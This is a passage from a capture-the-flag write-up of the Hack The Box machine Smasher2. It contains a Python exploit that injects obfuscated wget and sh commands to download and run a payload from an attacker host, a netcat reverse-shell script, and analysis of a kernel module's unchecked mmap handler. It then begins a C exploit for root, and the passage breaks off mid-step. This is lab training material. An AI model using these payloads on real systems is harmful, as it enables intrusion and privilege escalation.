<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">(session)</span>:</span></span><br><span class="line">	req = session.post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/auth"</span>, json=&#123;<span class="string">"action"</span>:<span class="string">"auth"</span>,<span class="string">"data"</span>:&#123;<span class="string">"username"</span>:<span class="string">"Administrator"</span>,<span class="string">"password"</span>:<span class="string">"Administrator"</span>&#125;&#125;)</span><br><span class="line">	response = req.json()</span><br><span class="line">	key = response[<span class="string">'result'</span>][<span class="string">'key'</span>]</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(session, key)</span>:</span></span><br><span class="line">	download_payload = <span class="string">"\'w\'g\'e\'t \'h\'t\'t\'p\':\'/\'/\'1\'0\'.\'1\'0\'.\'x\'x\'.\'x\'x\'/\'s\'h\'e\'l\'l\'.\'s\'h\'"</span></span><br><span class="line">	print(YELLOW + <span class="string">"[+] Downloading payload"</span>)</span><br><span class="line">	download_req = session.post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/api/&#123;&#125;/job"</span>.format(key), json=&#123;<span class="string">"schedule"</span>:download_payload&#125;)</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done"</span>)</span><br><span class="line">	exec_payload = <span class="string">"s\'h\' \'s\'h\'e\'l\'l\'.\'s\'h"</span></span><br><span class="line">	print(YELLOW + <span class="string">"[+] Executing payload"</span>)</span><br><span class="line">	exec_req = session.post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/api/&#123;&#125;/job"</span>.format(key), json=&#123;<span class="string">"schedule"</span>:exec_payload&#125;)</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done. Exiting ..."</span>)</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.get(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/login"</span>)</span><br><span class="line">print(YELLOW +<span class="string">"[+] Authenticating"</span>)</span><br><span class="line">key = getKey(session)</span><br><span class="line">print(GREEN + <span class="string">"[*] Session: "</span> + session.cookies.get_dict()[<span class="string">'session'</span>])</span><br><span class="line">print(GREEN + <span class="string">"[*] key: "</span> + key)</span><br><span class="line">exploit(session, key)</span><br></pre></td></tr></table></figure>
<p>The exploit sends 2 commands, the first one is a <code>wget</code> command that downloads <code>shell.sh</code> and the other one executes it.<br><code>shell.sh</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
<p>I hosted it on a python server and I started a <code>netcat</code> listener on port 1337 then I ran the exploit:<br><img src="/images/hackthebox/smasher2/10.png" alt=""><br>We owned user.</p>
<h2 id="dhid-ko-Enumeration"><a href="#dhid-ko-Enumeration" class="headerlink" title="dhid.ko: Enumeration"></a>dhid.ko: Enumeration</h2><p>After getting a shell I copied my public <code>ssh</code> key to <code>/home/dzonerzy/.ssh/authorized_keys</code> and got ssh access.<br>In the home directory of <code>dzonerzy</code> there was a <code>README</code> containing a message from him saying that we’ll need to think outside the box to root smasher2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ ls -al</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17  2019 .</span><br><span class="line">drwxr-xr-x 3 root     root     4096 Feb 15  2019 ..</span><br><span class="line">lrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16  2019 .bashrc</span><br><span class="line">drwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .cache</span><br><span class="line">drwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .gnupg</span><br><span class="line">drwx------ 5 dzonerzy dzonerzy 4096 Feb 17  2019 .local</span><br><span class="line">-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15  2019 .profile</span><br><span class="line">-rw-r--r-- 1 root     root      900 Feb 16  2019 README</span><br><span class="line">drwxrwxr-x 4 dzonerzy dzonerzy 4096 Dec 13 12:50 smanager</span><br><span class="line">-rw-r----- 1 root     dzonerzy   33 Feb 17  2019 user.txt</span><br><span class="line">dzonerzy@smasher2:~$ cat README </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         .|&#39;&#39;&#39;.|                            &#39;||                      </span><br><span class="line">         ||..  &#39;  .. .. ..    ....    ....   || ..     ....  ... ..  </span><br><span class="line">          &#39;&#39;|||.   || || ||  &#39;&#39; .||  ||. &#39;   ||&#39; ||  .|...||  ||&#39; &#39;&#39; </span><br><span class="line">        .     &#39;||  || || ||  .|&#39; ||  . &#39;|..  ||  ||  ||       ||     </span><br><span class="line">        |&#39;....|&#39;  .|| || ||. &#39;|..&#39;|&#39; |&#39;..|&#39; .||. ||.  &#39;|...&#39; .||.    v2.0 </span><br><span class="line">                                                             </span><br><span class="line">                                                        by DZONERZY </span><br><span class="line"></span><br><span class="line">Ye you&#39;ve come this far and I hope you&#39;ve learned something new, smasher wasn&#39;t created</span><br><span class="line">with the intent to be a simple puzzle game... but instead I just wanted to pass my limited</span><br><span class="line">knowledge to you fellow hacker, I know it&#39;s not much but this time you&#39;ll need more than</span><br><span class="line">skill, you will need to think outside the box to complete smasher 2 , have fun and happy</span><br><span class="line"></span><br><span class="line">                                       Hacking!</span><br><span class="line"></span><br><span class="line">free(knowledge);</span><br><span class="line">free(knowledge);</span><br><span class="line">* error for object 0xd00000000b400: pointer being freed was not allocated *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dzonerzy@smasher2:~$</span><br></pre></td></tr></table></figure>
<p>After some enumeration, I checked the <code>auth</code> log and saw this line:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat &#x2F;var&#x2F;log&#x2F;auth.log</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">Dec 13 11:49:34 smasher2 sudo:     root : TTY&#x3D;unknown ; PWD&#x3D;&#x2F; ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;insmod &#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;dhid.ko</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">dzonerzy@smasher2:~$</span><br></pre></td></tr></table></figure>
<p><code>insmod</code> (stands for <code>insert module</code>) is a tool used to load kernel modules. <code>dhid.ko</code> is a kernel module (<code>ko</code> stands for kernel object)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cd &#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ file dhid.ko </span><br><span class="line">dhid.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]&#x3D;d4315261f7c9c38393394f6779378abcff6270d2, not stripped</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure>
<p>I checked the loaded kernel modules and that module was still loaded:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ lsmod | grep dhid</span><br><span class="line">dhid                   16384  0</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure>
<p>We can use <code>modinfo</code> to list the information about that module, as you can see it was written by <code>dzonerzy</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ modinfo dhid</span><br><span class="line">filename:       &#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;dhid.ko</span><br><span class="line">version:        1.0</span><br><span class="line">description:    LKM for dzonerzy dhid devices</span><br><span class="line">author:         DZONERZY</span><br><span class="line">license:        GPL</span><br><span class="line">srcversion:     974D0512693168483CADFE9</span><br><span class="line">depends:        </span><br><span class="line">retpoline:      Y</span><br><span class="line">name:           dhid</span><br><span class="line">vermagic:       4.15.0-45-generic SMP mod_unload </span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure>
<p>Last thing I wanted to check was if there was device driver file for the module:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ ls -la &#x2F;dev&#x2F; | grep dhid</span><br><span class="line">crwxrwxrwx  1 root root    243,   0 Dec 13 11:49 dhid</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure>
<p>I downloaded the module on my box to start analyzing it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# scp -i id_rsa dzonerzy@smasher2.htb:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;dhid.ko .&#x2F; </span><br><span class="line">dhid.ko                                                                                                                                                                                                  100% 8872    16.1KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# file dhid.ko </span><br><span class="line">dhid.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]&#x3D;d4315261f7c9c38393394f6779378abcff6270d2, not stripped</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure>


<h2 id="dhid-ko-Analysis"><a href="#dhid-ko-Analysis" class="headerlink" title="dhid.ko: Analysis"></a>dhid.ko: Analysis</h2><p>I opened the module in <code>ghidra</code> then I started checking the functions:<br><img src="/images/hackthebox/smasher2/11.png" alt=""><br>The function <code>dev_read()</code> had a hint that this is the intended way to root the box:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">dev_read</span><span class="params">(undefined8 param_1,undefined8 param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  iVar1 = _copy_to_user(param_2,<span class="string">"This is the right way, please exploit this shit!"</span>,<span class="number">0x30</span>);</span><br><span class="line">  <span class="keyword">return</span> (ulong)(-(uint)(iVar1 == <span class="number">0</span>) &amp; <span class="number">0xf</span>) - <span class="number">0xe</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>One interesting function that caught my attention was <code>dev_mmap()</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ulong <span class="title">dev_mmap</span><span class="params">(undefined8 param_1,<span class="keyword">long</span> *param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  uVar3 = (<span class="keyword">int</span>)param_2[<span class="number">1</span>] - *(<span class="keyword">int</span> *)param_2;</span><br><span class="line">  uVar1 = (uint)(param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span>);</span><br><span class="line">  printk(&amp;DAT_00100380,(ulong)uVar3,param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span> &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="keyword">if</span> ((((<span class="keyword">int</span>)uVar3 &lt; <span class="number">0x10001</span>) &amp;&amp; (uVar1 &lt; <span class="number">0x1001</span>)) &amp;&amp; ((<span class="keyword">int</span>)(uVar3 + uVar1) &lt; <span class="number">0x10001</span>)) &#123;</span><br><span class="line">    uVar1 = remap_pfn_range(param_2,*param_2,(<span class="keyword">long</span>)(<span class="keyword">int</span>)uVar1,param_2[<span class="number">1</span>] - *param_2,param_2[<span class="number">9</span>]);</span><br><span class="line">    uVar2 = (ulong)uVar1;</span><br><span class="line">    <span class="keyword">if</span> (uVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      printk(&amp;DAT_0010057b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uVar2 = <span class="number">0xfffffff5</span>;</span><br><span class="line">      printk(&amp;DAT_00100567);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">0xfffffff5</span>;</span><br><span class="line">    printk(&amp;DAT_001003b0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In case you don’t know what <code>mmap</code> is, simply <code>mmap</code> is a system call which is used to map memory to a file or a device. (Check <a href="https://jameshfisher.com/2017/01/26/mmap/" target="_blank" rel="noopener">this</a>)<br>The function <code>dev_mmap()</code> is a custom <code>mmap</code> handler.<br>The interesting part here is the call to <code>remap_pfn_range()</code> function (remap kernel memory to userspace):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remap_pfn_range(param_2,*param_2,(<span class="keyword">long</span>)(<span class="keyword">int</span>)uVar1,param_2[<span class="number">1</span>] - *param_2,param_2[<span class="number">9</span>]);</span><br></pre></td></tr></table></figure>
<p>I checked the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-remap-pfn-range.html" target="_blank" rel="noopener">documentation</a> of <code>remap_pfn_range()</code> to know more about it, the function takes 5 arguments:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remap_pfn_range</span> <span class="params">(	struct vm_area_struct * vma,</span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn,</span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span>,</span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="keyword">pgprot_t</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
<p>Description of each argument:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">vma</span></span></span><br><span class="line"><span class="class">    <span class="title">user</span> <span class="title">vma</span> <span class="title">to</span> <span class="title">map</span> <span class="title">to</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">long</span> <span class="title">addr</span></span></span><br><span class="line"><span class="class">    <span class="title">target</span> <span class="title">user</span> <span class="title">address</span> <span class="title">to</span> <span class="title">start</span> <span class="title">at</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span></span></span><br><span class="line"><span class="class">    <span class="title">physical</span> <span class="title">address</span> <span class="title">of</span> <span class="title">kernel</span> <span class="title">memory</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">long</span> <span class="title">size</span></span></span><br><span class="line"><span class="class">    <span class="title">size</span> <span class="title">of</span> <span class="title">map</span> <span class="title">area</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">pgprot_t</span> <span class="title">prot</span></span></span><br><span class="line"><span class="class">    <span class="title">page</span> <span class="title">protection</span> <span class="title">flags</span> <span class="title">for</span> <span class="title">this</span> <span class="title">mapping</span></span></span><br></pre></td></tr></table></figure>
<p>If we look at the function call again we can see that the 3rd and 4th arguments (physical address of the kernel memory and size of map area) are given to the function without any prior validation:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ulong <span class="title">dev_mmap</span><span class="params">(undefined8 param_1,<span class="keyword">long</span> *param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  uVar3 = (<span class="keyword">int</span>)param_2[<span class="number">1</span>] - *(<span class="keyword">int</span> *)param_2;</span><br><span class="line">  uVar1 = (uint)(param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span>);</span><br><span class="line">  printk(&amp;DAT_00100380,(ulong)uVar3,param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span> &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="keyword">if</span> ((((<span class="keyword">int</span>)uVar3 &lt; <span class="number">0x10001</span>) &amp;&amp; (uVar1 &lt; <span class="number">0x1001</span>)) &amp;&amp; ((<span class="keyword">int</span>)(uVar3 + uVar1) &lt; <span class="number">0x10001</span>)) &#123;</span><br><span class="line">    uVar1 = remap_pfn_range(param_2,*param_2,(<span class="keyword">long</span>)(<span class="keyword">int</span>)uVar1,param_2[<span class="number">1</span>] - *param_2,param_2[<span class="number">9</span>]);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>This means that we can map any size of memory we want and read/write to it, allowing us to even access the kernel memory.</p>
<h2 id="dhid-ko-Exploitation-–-gt-Root-Shell-–-gt-Root-Flag"><a href="#dhid-ko-Exploitation-–-gt-Root-Shell-–-gt-Root-Flag" class="headerlink" title="dhid.ko: Exploitation –&gt; Root Shell –&gt; Root Flag"></a>dhid.ko: Exploitation –&gt; Root Shell –&gt; Root Flag</h2><p>Luckily, <a href="https://labs.f-secure.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf" target="_blank" rel="noopener">this white paper</a> had a similar scenario and explained the exploitation process very well, I recommend reading it after finishing the write-up, I will try to explain the process as good as I can but the paper will be more detailed. In summary, what’s going to happen is that we’ll map a huge amount of memory and search through it for our process’s <code>cred</code> structure (The <code>cred</code> structure holds our process credentials) then overwrite our <code>uid</code> and <code>gid</code> with <code>0</code> and execute <code>/bin/sh</code>. Let’s go through it step by step.<br>First, we need to make sure that it’s really exploitable, we’ll try to map a huge amount of memory and check if it worked:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] PID: %d\n"</span>, getpid());</span><br><span class="line">	<span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Open failed!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">		perror(<span class="string">"[!] Failed to mmap"</span>);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">stop</span> = getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>I compiled the code and uploaded it to the box:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# gcc -o pwn pwn.c </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# scp -i id_rsa .&#x2F;pwn dzonerzy@smasher2.htb:&#x2F;dev&#x2F;shm&#x2F;pwn</span><br><span class="line">pwn                                                                                100%   17KB  28.5KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure>
<p>Then I ran it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 8186</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br></pre></td></tr></table></figure>
<p>From another <code>ssh</code> session I checked the process memory mapping, the attempt was successful:</p>
